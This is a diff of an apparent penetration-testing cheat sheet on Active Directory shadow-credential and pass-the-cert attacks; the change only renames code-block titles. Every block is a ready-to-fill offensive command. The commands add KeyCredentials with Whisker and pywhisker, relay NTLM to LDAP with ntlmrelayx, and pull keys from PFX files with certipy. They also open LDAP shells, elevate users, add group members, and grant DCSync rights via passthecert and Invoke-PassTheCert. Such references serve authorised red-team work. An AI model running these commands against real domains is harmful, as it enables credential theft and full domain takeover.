@@ -6,7 +6,7 @@
 
 List `msDS-KeyCredentialLink` entries on a target object.
 
-```powershell title:"List shadow credential entries with Whisker"
+```powershell title:"Pass The Cert / Whisker List shadow credential entries with Whisker"
 .\Whisker.exe list /target:"$target_samname" /domain:"$domain" /dc:"$dc_name"
 ```
 <!-- cheat
@@ -19,7 +19,7 @@ var dc_name
 
 Generate a key pair, add a KeyCredential to the target, and export a PFX.
 
-```powershell title:"Add shadow credentials with Whisker"
+```powershell title:"Pass The Cert / Whisker Add shadow credentials with Whisker"
 .\Whisker.exe add /target:"$target_samname" /domain:"$domain" /dc:"$dc_name" /path:"$pfx_file" /password:"$pfx_pass"
 ```
 <!-- cheat
@@ -34,7 +34,7 @@ var pfx_pass
 
 Remove a KeyCredential by DeviceID.
 
-```powershell title:"Remove shadow credential with Whisker"
+```powershell title:"Pass The Cert / Whisker Remove shadow credential with Whisker"
 .\Whisker.exe remove /target:"$target_samname" /domain:"$domain" /dc:"$dc_name" /remove:"$device_id"
 ```
 <!-- cheat
@@ -50,7 +50,7 @@ var device_id
 
 List KeyCredential entries from Linux.
 
-```sh title:"List shadow credentials with pywhisker"
+```sh title:"Pass The Cert / Whisker List shadow credentials with pywhisker"
 pywhisker.py -d "$domain" -u "$user" -p "$pass" --target "$target_samname" --action list
 ```
 <!-- cheat
@@ -64,7 +64,7 @@ var target_samname
 
 Add a KeyCredential and write the generated PFX material to a named file.
 
-```sh title:"Add shadow credentials with pywhisker"
+```sh title:"Pass The Cert / Whisker Add shadow credentials with pywhisker"
 pywhisker.py -d "$domain" -u "$user" -p "$pass" --target "$target_samname" --action add --filename "$output_name"
 ```
 <!-- cheat
@@ -79,7 +79,7 @@ var output_name
 
 Remove a KeyCredential by DeviceID.
 
-```sh title:"Remove shadow credential with pywhisker"
+```sh title:"Pass The Cert / Whisker Remove shadow credential with pywhisker"
 pywhisker.py -d "$domain" -u "$user" -p "$pass" --target "$target_samname" --action remove --device-id "$device_id"
 ```
 <!-- cheat
@@ -94,7 +94,7 @@ var device_id
 
 Use ntlmrelayx to add shadow credentials during LDAP relay.
 
-```sh title:"Relay to LDAP and add shadow credentials"
+```sh title:"Pass The Cert / Whisker Relay to LDAP and add shadow credentials"
 ntlmrelayx.py -t "ldap://$dc_fqdn" --shadow-credentials --shadow-target "$target_samname"
 ```
 <!-- cheat
@@ -108,7 +108,7 @@ var target_samname
 
 Extract only the certificate for Schannel LDAP auth.
 
-```sh title:"Extract certificate PEM from PFX"
+```sh title:"Pass The Cert / Whisker Extract certificate PEM from PFX"
 certipy cert -pfx "$pfx_file" -nokey -out "$cert_file"
 ```
 <!-- cheat
@@ -120,7 +120,7 @@ var cert_file
 
 Extract only the private key for Schannel LDAP auth.
 
-```sh title:"Extract key PEM from PFX"
+```sh title:"Pass The Cert / Whisker Extract key PEM from PFX"
 certipy cert -pfx "$pfx_file" -nocert -out "$key_file"
 ```
 <!-- cheat
@@ -132,7 +132,7 @@ var key_file
 
 Open an LDAP shell through Schannel with a certificate and key.
 
-```sh title:"Open Schannel LDAP shell with passthecert"
+```sh title:"Pass The Cert / Whisker Open Schannel LDAP shell with passthecert"
 passthecert.py -action ldap-shell -crt "$cert_file" -key "$key_file" -domain "$domain" -dc-ip "$rhost_ip"
 ```
 <!-- cheat
@@ -146,7 +146,7 @@ var domain
 
 Use Schannel LDAP auth to grant a target user elevated rights.
 
-```sh title:"Elevate user with passthecert.py"
+```sh title:"Pass The Cert / Whisker Elevate user with passthecert.py"
 passthecert.py -action modify_user -crt "$cert_file" -key "$key_file" -domain "$domain" -dc-ip "$rhost_ip" -target "$target_samname" -elevate
 ```
 <!-- cheat
@@ -163,7 +163,7 @@ var target_samname
 
 Use the Windows C# PassTheCert tool to add an account to a group over LDAPS.
 
-```powershell title:"Add account to group with PassTheCert.exe"
+```powershell title:"Pass The Cert / Whisker Add account to group with PassTheCert.exe"
 .\PassTheCert.exe --server "$dc_fqdn" --cert-path "$pfx_file" --add-account-to-group --target "$target_group_dn" --account "$target_user_dn"
 ```
 <!-- cheat
@@ -179,7 +179,7 @@ var target_user_dn
 
 Load Invoke-PassTheCert in PowerShell.
 
-```powershell title:"Import Invoke-PassTheCert"
+```powershell title:"Pass The Cert / Whisker Import Invoke-PassTheCert"
 Import-Module .\Invoke-PassTheCert.ps1
 ```
 <!-- cheat -->
@@ -188,7 +188,7 @@ Import-Module .\Invoke-PassTheCert.ps1
 
 Create a Schannel-backed LDAP connection from a PFX.
 
-```powershell title:"Create Schannel LDAP connection"
+```powershell title:"Pass The Cert / Whisker Create Schannel LDAP connection"
 $ldap = Invoke-PassTheCert-GetLDAPConnectionInstance -Server "$rhost_ip" -Port 636 -Certificate "$pfx_file"
 ```
 <!-- cheat
@@ -200,7 +200,7 @@ var pfx_file
 
 Add a user to a group over the certificate-backed LDAP connection.
 
-```powershell title:"Add group member with Invoke-PassTheCert"
+```powershell title:"Pass The Cert / Whisker Add group member with Invoke-PassTheCert"
 Invoke-PassTheCert -Action AddGroupMember -LdapConnection $ldap -Identity "$target_user_dn" -GroupDN "$target_group_dn"
 ```
 <!-- cheat
@@ -213,7 +213,7 @@ var ldap
 
 Grant DCSync rights over the domain object using certificate-backed LDAP.
 
-```powershell title:"Grant DCSync with Invoke-PassTheCert"
+```powershell title:"Pass The Cert / Whisker Grant DCSync with Invoke-PassTheCert"
 Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $ldap -Exploit 'DCSync' -Identity "$controlled_user_dn" -Target "$domain_dn"
 ```
 <!-- cheat
